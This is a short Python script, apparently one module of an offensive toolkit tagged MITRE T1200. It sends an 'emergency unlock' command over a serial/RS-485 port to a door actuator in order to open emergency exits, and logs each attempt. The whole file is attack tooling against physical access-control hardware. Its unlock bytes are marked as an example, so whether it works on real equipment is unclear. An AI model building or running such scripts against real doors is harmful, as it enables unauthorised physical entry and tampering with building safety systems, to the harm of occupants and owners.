#!/usr/bin/env python3
# modules/attacks/emergency_door_unlocker.py

import os
import json
import time
import argparse
from datetime import datetime
import serial

LOG_FILE = "results/emergency_unlock_log.json"
MITRE_TTP = "T1200"

def log_event(port, command):
    os.makedirs("results", exist_ok=True)
    log = {
        "timestamp": datetime.utcnow().isoformat(),
        "serial_port": port,
        "command_sent": command,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(log) + "\n")

def unlock_door(port):
    try:
        with serial.Serial(port, 9600, timeout=2) as ser:
            # Example emergency unlock command: \x02UNLOCK\x03
            command = b'\x02UNLOCK\x03'
            ser.write(command)
            log_event(port, command.hex())
            print(f"[✓] Emergency unlock command sent via {port}")
    except Exception as e:
        print(f"[!] Serial communication failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Unlock emergency exits via RS-485/serial")
    parser.add_argument("--port", required=True, help="Serial port connected to actuator")
    args = parser.parse_args()

    unlock_door(args.port)
